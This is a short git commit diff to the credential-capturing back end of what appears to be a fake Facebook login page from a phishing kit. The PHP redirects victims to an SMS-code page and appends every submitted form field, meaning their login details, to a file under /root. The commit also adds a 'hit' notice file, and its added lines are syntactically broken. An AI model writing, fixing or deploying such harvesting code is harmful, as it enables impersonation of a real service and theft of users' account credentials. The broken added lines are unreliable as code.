1e7191b1db022f15b2407e6f3748888e5421f6ab
princeofguilty <princeofguilty@hotmail.com>
2016-08-29 19:06:35 +0300

    Update data.php

--- Sites/Facebook/data.php
+++ Sites/Facebook/data.php
@@ -2,18 +2,16 @@
 header("Location: smscode.htm");
 $handle = fopen("/root/Facebookusers.txt", "a");
 foreach($_POST as $variable => $value) {
-fwrite("Essid =", $essid );
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
 fwrite($handle, $value);
 fwrite($handle, "\r\n");
 }
 fclose($handle);
+$hit1 = fopen("/tmp/TEMPares/hit.txt", "w+")
+fclose($hit1);
+$hit2 = fopen("/tmp/TEMPares/hit.txt", "a")
+fwrite($hit2,"attempts at /root/facebookusers.txt" 
+fclose($hit2);
 exit;
 ?> 
